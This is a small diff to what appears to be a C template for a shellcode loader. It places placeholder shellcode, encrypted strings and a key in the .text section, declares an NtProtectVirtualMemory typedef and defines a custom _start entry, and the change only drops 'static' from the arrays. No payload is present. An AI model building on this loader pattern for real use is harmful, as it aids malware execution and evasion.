@@ -99,9 +99,9 @@ typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
     PULONG OldProtect
 );
 
-__attribute__((section(".text"))) static unsigned char shellcode[] = {{ {shellcode_array} }};
-__attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};
-__attribute__((section(".text"))) static unsigned char key[] = {{ {key_array} }};
+__attribute__((section(".text"))) unsigned char shellcode[] = {{ {shellcode_array} }};
+__attribute__((section(".text"))) unsigned char enc_strings[] = {{ {combined_array} }};
+__attribute__((section(".text"))) unsigned char key[] = {{ {key_array} }};
     
 __attribute__((section(".text.start")))
 void _start() {{
